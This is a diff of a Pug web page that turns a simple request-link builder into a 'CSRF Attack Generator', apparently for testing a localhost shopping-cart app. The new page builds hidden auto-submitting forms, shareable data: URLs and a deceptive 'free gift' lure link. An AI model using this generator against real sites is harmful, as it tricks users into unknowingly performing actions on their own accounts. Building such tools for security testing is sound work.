@@ -1,98 +1,274 @@
 doctype html
 html(lang="vi")
   head
-    meta(charset="UTF-8")
-    meta(name="viewport", content="width=device-width, initial-scale=1.0")
-    title Tạo link request
+    meta(charset="utf-8")
+    title CSRF Attack Generator
     style.
-      body {
-        font-family: "Segoe UI", sans-serif;
-        background: #f5f5f5;
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        justify-content: center;
-        min-height: 100vh;
+      * {
+        box-sizing: border-box;
         margin: 0;
+        padding: 0;
+      }
+      body {
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        min-height: 100vh;
+        padding: 20px;
       }
       .container {
+        max-width: 900px;
+        margin: 0 auto;
         background: white;
-        padding: 30px;
-        border-radius: 16px;
-        box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-        width: 400px;
+        border-radius: 12px;
+        box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        overflow: hidden;
       }
-      h2 {
+      .header {
+        background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+        color: white;
+        padding: 30px;
         text-align: center;
+      }
+      .header h1 {
+        font-size: 2em;
+        margin-bottom: 10px;
+      }
+      .content {
+        padding: 30px;
+      }
+      .form-group {
         margin-bottom: 20px;
-        color: #333;
       }
       label {
         display: block;
-        margin-top: 10px;
-        font-weight: bold;
+        font-weight: 600;
+        margin-bottom: 8px;
+        color: #333;
       }
-      input, select, button {
+      input, select, textarea {
         width: 100%;
-        padding: 10px;
-        margin-top: 6px;
-        border: 1px solid #ccc;
-        border-radius: 8px;
-        font-size: 15px;
+        padding: 12px;
+        border: 2px solid #e0e0e0;
+        border-radius: 6px;
+        font-size: 14px;
+        transition: border-color 0.3s;
+      }
+      input:focus, select:focus, textarea:focus {
+        outline: none;
+        border-color: #667eea;
+      }
+      .params-container {
+        background: #f8f9fa;
+        padding: 15px;
+        border-radius: 6px;
+        margin-bottom: 10px;
+      }
+      .param-row {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 10px;
+      }
+      .param-row input {
+        flex: 1;
       }
       button {
-        background: #007bff;
-        color: white;
+        padding: 12px 24px;
         border: none;
-        margin-top: 16px;
+        border-radius: 6px;
+        font-size: 14px;
+        font-weight: 600;
         cursor: pointer;
-        transition: 0.3s;
+        transition: all 0.3s;
       }
-      button:hover {
-        background: #0056b3;
+      .btn-primary {
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        color: white;
       }
-      .output {
-        margin-top: 20px;
+      .btn-primary:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
+      }
+      .btn-secondary {
+        background: #6c757d;
+        color: white;
+      }
+      .btn-add {
+        background: #28a745;
+        color: white;
+        width: 100%;
+        margin-top: 10px;
+      }
+      .output-section {
+        margin-top: 30px;
+        padding-top: 30px;
+        border-top: 2px solid #e0e0e0;
+      }
+      .output-box {
+        background: #f8f9fa;
+        border: 2px solid #e0e0e0;
+        border-radius: 6px;
+        padding: 15px;
+        margin-top: 15px;
+        position: relative;
+      }
+      .output-box pre {
+        margin: 0;
+        white-space: pre-wrap;
         word-wrap: break-word;
-        background: #f0f8ff;
-        padding: 10px;
-        border-radius: 8px;
-        font-family: monospace;
+        font-family: 'Courier New', monospace;
+        font-size: 13px;
+      }
+      .copy-btn {
+        position: absolute;
+        top: 10px;
+        right: 10px;
+        background: #667eea;
+        color: white;
+        padding: 6px 12px;
+        font-size: 12px;
+      }
+      .url-box {
+        background: #fff3cd;
+        border: 2px solid #ffc107;
+        padding: 15px;
+        border-radius: 6px;
+        margin-top: 15px;
+        word-break: break-all;
+      }
+      .hidden {
+        display: none;
       }
   body
     .container
-      h2 🔗 Tạo Link Request
-      form#linkForm
-        label(for="method") Chọn phương thức:
-        select#method(name="method")
-          option(value="GET") GET
-          option(value="POST") POST
-          option(value="PUT") PUT
-          option(value="DELETE") DELETE
+      .header
+        h1 🔓 CSRF Attack Generator
+        p Generate malicious forms for CSRF testing
 
-        label(for="url") Nhập URL:
-        input#url(type="text" name="url" placeholder="http://localhost:3000/api/...")
+      .content
+        .form-group
+          label(for="action") Target URL (Action):
+          input#action(type="text" placeholder="http://localhost:3000/cart/remove/68efc0d8f4adae573c528cd8")
 
-        button(type="submit") Tạo link
+        .form-group
+          label(for="method") HTTP Method:
+          select#method
+            option(value="POST") POST
+            option(value="GET") GET
+            option(value="PUT") PUT
+            option(value="DELETE") DELETE
+            option(value="PATCH") PATCH
 
-      .output#result
+        .form-group
+          label
+            input#useOverride(type="checkbox")
+            |  Use method override (_method parameter)
+
+        .form-group
+          label(for="linkText") Deceptive Link Text:
+          input#linkText(type="text" value="Click here for a free gift! 🎁")
+
+        .form-group
+          label Hidden Parameters:
+          .params-container#paramsContainer
+            .param-row
+              input.param-name(type="text" placeholder="Parameter name")
+              input.param-value(type="text" placeholder="Parameter value")
+              button.btn-secondary(type="button" onclick="removeParam(this)") Remove
+          button.btn-add(type="button" onclick="addParam()") + Add Parameter
+
+        button.btn-primary(type="button" onclick="generate()" style="width: 100%; margin-top: 20px;") Generate CSRF Attack
+
+        .output-section#outputSection(style="display:none;")
+          h3 Generated HTML:
+          .output-box
+            button.copy-btn(type="button" onclick="copyCode()") Copy
+            pre#codeOutput
+
+          h3(style="margin-top: 20px;") Shareable Attack URL:
+          .url-box
+            strong data:text/html,
+            span#urlOutput
+          button.btn-primary(type="button" onclick="navigator.clipboard.writeText(document.getElementById('urlOutput').textContent).then(() => alert('URL copied to clipboard!'))")
 
     script.
-      const form = document.getElementById('linkForm');
-      const result = document.getElementById('result');
-      form.addEventListener('submit', e => {
-        e.preventDefault();
-        const method = document.getElementById('method').value;
-        const url = document.getElementById('url').value.trim();
+      // Function to add new parameter fields
+      function addParam() {
+        const container = document.getElementById('paramsContainer');
+        const paramRow = document.createElement('div');
+        paramRow.className = 'param-row';
+        paramRow.innerHTML = `
+          <input type="text" class="param-name" placeholder="Parameter name">
+          <input type="text" class="param-value" placeholder="Parameter value">
+          <button type="button" class="btn-secondary" onclick="removeParam(this)">Remove</button>
+        `;
+        container.appendChild(paramRow);
+      }
 
-        if (!url) {
-          result.innerHTML = '<span style="color:red;">⚠️ Vui lòng nhập URL</span>';
+      // Function to remove a parameter field
+      function removeParam(button) {
+        button.parentElement.remove();
+      }
+
+      // Function to copy code to clipboard
+      function copyCode() {
+        const code = document.getElementById('codeOutput').textContent;
+        navigator.clipboard.writeText(code).then(() => {
+          alert('Code copied to clipboard!');
+        });
+      }
+
+      // Main generate function
+      function generate() {
+        const actionInput = document.getElementById('action');
+        if (!actionInput || !actionInput.value) {
+          alert('Please enter a target URL');
+          actionInput.focus();
           return;
         }
-
-        const fullLink = `http://localhost:3000/send?method=${encodeURIComponent(method)}&url=${encodeURIComponent(url)}`;
-        result.innerHTML = `
-          ✅ Link đã tạo:<br>
-          <a href="${fullLink}" target="_blank">${fullLink}</a>
+        
+        const targetUrl = actionInput.value;
+        const method = document.getElementById('method').value;
+        const useOverride = document.getElementById('useOverride').checked;
+        const linkText = document.getElementById('linkText').value || 'Click here';
+        
+        // Collect parameters
+        const params = [];
+        document.querySelectorAll('.param-row').forEach(row => {
+          const name = row.querySelector('.param-name').value.trim();
+          const value = row.querySelector('.param-value').value.trim();
+          if (name) {
+            params.push(`${encodeURIComponent(name)}=${encodeURIComponent(value)}`);
+          }
+        });
+        
+        // Create form HTML
+        let formHtml = `
+          <form action="${targetUrl}" method="${useOverride ? 'POST' : method}" id="csrf-form">
+            ${useOverride ? `<input type="hidden" name="_method" value="${method}">` : ''}
         `;
-      });
+        
+        // Add parameters as hidden inputs
+        document.querySelectorAll('.param-row').forEach(row => {
+          const name = row.querySelector('.param-name').value.trim();
+          const value = row.querySelector('.param-value').value.trim();
+          if (name) {
+            formHtml += `<input type="hidden" name="${name.replace(/"/g, '&quot;')}" value="${value.replace(/"/g, '&quot;')}">`;
+          }
+        });
+        
+        formHtml += `
+            <button type="submit" style="display: none;">Submit</button>
+          </form>
+          <a href="#" onclick="document.getElementById('csrf-form').submit(); return false;">${linkText}</a>
+        `;
+        
+        // Display the generated code
+        document.getElementById('codeOutput').textContent = formHtml;
+        
+        // Create data URL
+        const dataUrl = `data:text/html,${encodeURIComponent(`<html><body>${formHtml}</body></html>`)}`;
+        document.getElementById('urlOutput').textContent = dataUrl;
+        
+        // Show the output section
+        document.getElementById('outputSection').style.display = 'block';
+      }
